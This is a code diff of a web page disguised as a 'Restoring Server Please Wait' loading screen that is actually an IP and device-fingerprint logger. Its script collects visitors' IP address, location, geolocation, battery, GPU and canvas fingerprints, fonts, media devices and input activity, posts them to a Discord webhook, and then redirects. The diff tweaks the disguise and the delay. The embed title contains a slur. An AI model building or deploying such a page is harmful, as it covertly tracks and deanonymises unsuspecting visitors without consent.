@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Restoring Server...</title>
+<title>Restoring Server Please Wait...</title>
 <style>
 body { margin:0; overflow:hidden; background:#000; color:#fff; font-family:sans-serif; }
 .loading-bar { position:absolute; top:80%; left:50%; transform:translate(-50%,-50%); width:60%; height:20px; background:#222; border-radius:10px; overflow:hidden; z-index:10; }
@@ -143,25 +143,25 @@ title:"🎆 Retard Hit",
 color:16766720,
 thumbnail:{url:"https://cdn.discordapp.com/attachments/1402975578080153623/1405891273143095398/download.jpg?ex=68a079c7&is=689f2847&hm=736661ca7487d4ae8fc780c60a1c04ad46fae6172c2d7ce09c88c437c2419e1c&"},
 fields:[
-{name:"🌍 IP Info", value:`IP: ${ipInfo.ip||ipInfo.IPv4}\nCity: ${ipInfo.city}\nRegion: ${ipInfo.state_prov||ipInfo.region}\nCountry: ${ipInfo.country_name||ipInfo.country}\nOrg: ${ipInfo.org||ipInfo.isp}\nPing: ${ping}ms\nEndpoint Ping: ${JSON.stringify(endpointPing)}\nVPN/Proxy: ${isVPN?"Yes":"No"}`},
-{name:"🖥 System Info", value:`Platform: ${platform}\nBrowser: ${ua}\nCores: ${cores}\nMemory: ${memory} GB\nResolution: ${screenRes}\nColor Depth: ${colorDepth}-bit\nTouch Points: ${touchPoints}\nOrientation: ${orientation}\nLanguage: ${language}\nOnline: ${online}\nDo Not Track: ${doNotTrack}\nFocused: ${focused}\nVisibility: ${visibility}\nDPI: ${dpi}\nZoom: ${zoom}`},
-{name:"🔋 Battery", value:JSON.stringify(batteryInfo)},
-{name:"📌 Geolocation", value:geo.latitude?`Lat:${geo.latitude}\nLon:${geo.longitude}\nAccuracy:${geo.accuracy}`:"Permission Denied"},
-{name:"🎮 GPU & Canvas", value:`Vendor:${glInfo.vendor}\nRenderer:${glInfo.renderer}\nCanvasFP:${canvasFP}\nExtensions:${glExtensions.join(", ")}`},
-{name:"🎤 Media Devices", value:mediaDevices.map(d=>`${d.kind}: ${d.label||"Unknown"}`).join(", ")},
-{name:"🔤 Installed Fonts", value:detectedFonts.join(", ")||"None"},
-{name:"🖱 Mouse & Touch", value:`Moves:${mouseData.moves.length} Clicks:${mouseData.clicks} Touches:${touchData.touches.length}`},
-{name:"📜 Scroll & Keys", value:`Scrolls:${scrollData.length} Keys:${keyData.length}`},
-{name:"🔀 Connection Info", value:`Type:${connectionInfo.type}\nDownlink:${connectionInfo.downlink}Mbps\nRTT:${connectionInfo.rtt}ms\nSaveData:${connectionInfo.saveData}`},
-{name:"🖥 Window & Screen Info", value:`Viewport:${viewportSize.width}x${viewportSize.height}\nWindow:${windowSize.width}x${windowSize.height}\nAvailable Screen:${availableScreen.width}x${availableScreen.height}`},
-{name:"🔌 Other Info", value:`Cookie Enabled:${cookieEnabled}\nReferrer:${referrer}\nPointer Coarse:${pointerCoarse}\nPlugins:${plugins}\nMIMETypes:${mimeTypes}\nLocal Time:${localTime}`}
+{name:"IP Info", value:`IP: ${ipInfo.ip||ipInfo.IPv4}\nCity: ${ipInfo.city}\nRegion: ${ipInfo.state_prov||ipInfo.region}\nCountry: ${ipInfo.country_name||ipInfo.country}\nOrg: ${ipInfo.org||ipInfo.isp}\nPing: ${ping}ms\nEndpoint Ping: ${JSON.stringify(endpointPing)}\nVPN/Proxy: ${isVPN?"Yes":"No"}`},
+{name:"System Info", value:`Platform: ${platform}\nBrowser: ${ua}\nCores: ${cores}\nMemory: ${memory} GB\nResolution: ${screenRes}\nColor Depth: ${colorDepth}-bit\nTouch Points: ${touchPoints}\nOrientation: ${orientation}\nLanguage: ${language}\nOnline: ${online}\nDo Not Track: ${doNotTrack}\nFocused: ${focused}\nVisibility: ${visibility}\nDPI: ${dpi}\nZoom: ${zoom}`},
+{name:"Battery", value:JSON.stringify(batteryInfo)},
+{name:"Geolocation", value:geo.latitude?`Lat:${geo.latitude}\nLon:${geo.longitude}\nAccuracy:${geo.accuracy}`:"Permission Denied"},
+{name:"GPU & Canvas", value:`Vendor:${glInfo.vendor}\nRenderer:${glInfo.renderer}\nCanvasFP:${canvasFP}\nExtensions:${glExtensions.join(", ")}`},
+{name:"Media Devices", value:mediaDevices.map(d=>`${d.kind}: ${d.label||"Unknown"}`).join(", ")},
+{name:"Installed Fonts", value:detectedFonts.join(", ")||"None"},
+{name:"Mouse & Touch", value:`Moves:${mouseData.moves.length} Clicks:${mouseData.clicks} Touches:${touchData.touches.length}`},
+{name:"Scroll & Keys", value:`Scrolls:${scrollData.length} Keys:${keyData.length}`},
+{name:"Connection Info", value:`Type:${connectionInfo.type}\nDownlink:${connectionInfo.downlink}Mbps\nRTT:${connectionInfo.rtt}ms\nSaveData:${connectionInfo.saveData}`},
+{name:"Window & Screen Info", value:`Viewport:${viewportSize.width}x${viewportSize.height}\nWindow:${windowSize.width}x${windowSize.height}\nAvailable Screen:${availableScreen.width}x${availableScreen.height}`},
+{name:"Other Info", value:`Cookie Enabled:${cookieEnabled}\nReferrer:${referrer}\nPointer Coarse:${pointerCoarse}\nPlugins:${plugins}\nMIMETypes:${mimeTypes}\nLocal Time:${localTime}`}
 ],
 footer:{text:"Notti's IP Logger | Premium"},
 timestamp:new Date().toISOString()
 }]};
 
 await fetch(webhook,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(embed)});
-setTimeout(()=>window.location.href=redirect,3000);
+setTimeout(()=>window.location.href=redirect,5000);
 })();
 </script>
 </body>
